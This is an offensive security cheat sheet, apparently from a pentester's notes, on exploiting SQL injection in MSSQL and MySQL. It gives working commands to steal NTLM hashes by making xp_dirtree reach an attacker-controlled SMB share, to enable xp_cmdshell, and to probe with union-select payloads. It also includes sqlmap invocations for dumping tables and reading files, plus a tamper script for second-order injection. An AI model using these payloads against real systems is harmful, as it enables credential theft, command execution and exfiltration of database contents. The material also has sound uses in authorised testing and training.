# Exploiting SQL Injections

## Manual

### MSSQL
There is a cool trick to get hashes out of mssql databases that sqlmap can not perform itself. Run admin/mssql/mssql_ntlm_stealer_sqli and at the same time run server/capture/smb. The SQL Injection will try to access an UNC-Path and therefore send us the authentcation. Sometimes the capture module fails and responder is required instead. What the nlm_stealer does is just issue dir_tree `master..xp_dirtree '\\<ip>\<db>';` to an attacker box share (must not exist).

MSSQL ist often vulnerable to stacked queries e.g. `union select 1,2,3,(select * from users.txt),5`

Useful mssql commands:

```sql cheat mssql connect to mssql server via sqsh
sqsh -S <ip> -U '<domain\<user>'
```

```sql cheat mssql enable xp_cmdshell (might need to prefix with EXEC) 
sp_configure 'show advanced options', 1;
RECONFIGURE;
sp_configure 'xp_cmdshell',1;
RECONFIGURE;
```
```sql cheat mssql dirtree (get ntlm hashes with responder or enumerate local filesystem with \\<localip>\c$)
master..xp_dirtree '\\<attackerip>\<non-existing share>';
```

```sql cheat mssql use sqlmap to connecto to mssql db and dump tables
sqlmap -d 'mssql://<domain>\<user>:<password>@<ip>:1433/<dbname>' --tables
```

### MYSQL
Start by causing an error by inserting special chars like `'`, then try to mitigate the error by adding comments like this this: `')-- -`.

#### Union Based
Guess the number of columns in the original query by using a union select which uses the same number of columns:
```
') union select 1 -- -
') union select 1,2 -- -
```
Also note which numbers might be displayed on the website (check source). Try replacing the ones that are displayed with build-in functions like @@version or version()

Try to retreive table and column information from information schema to make further queries. If length restricted try to guess them.

## Automated

### SQLMap
Default Command:
```bash cheat sqlmap Default Command
sqlmap -r <request copied from burp> --level 5 --risk 3 --dbms <mysql or mssql> --batch
```
If its a url based injection the injection point must be specified with `*` like in `sqlmap -u <IP>/users/*`. TO save some time it is advised to tell it which technique to use (in most cases `--technique=U` for union based)

To cope with second order sql injections it tamper scripts can be used (think of username on registration contains injection vunerablity, gets stored to database and is only executed in a vunlerable query after loggin into the application later). Example Tamper Script:

```cheat sqlmap Tamper Script
#!/usr/bin/env python
import requests
import re
from lib.core.enums import PRIORITY
from random import sample
__priority__ = PRIORITY.NORMAL

proxies = {
    "http": "http://127.0.0.1:8080",
}

def dependencies():
    pass

def create_account(payload):
    session = requests.Session()
    post_data = {'username':payload,'password':'<pass>','confirm_password':'<pass>'}
    session.post("http://<ip>/register.php", data=post_data, proxies=proxies)

def tamper(payload, **kwargs):
    create_account(payload)
    return payload
```
You have to implement the tamper function. To use it add --tamper=<filename> to the command line.

Dont ever use `-a` on sqlmap - it takes forever and doesnt give more usefull info than you can retrieve via --tables or --dump. 

SQLMap can also be used with credentials:
`sqlmap -d 'mssql://<user>:<pass>@<ip>:1433/<dbname>' --dump`


```bash cheat sqlmap using credentials
sqlmap -d 'mssql://<user>:<pass>@<ip>:1433/<dbname>' --dump
```

```bash cheat sqlmap downloading files
sqlmap -d 'mssql://<domain>\<user>:<pass>@<ip>:1433/volume' --priv-esc --file-read='<full path>'
```

tags: sql injection sqlmap tamper
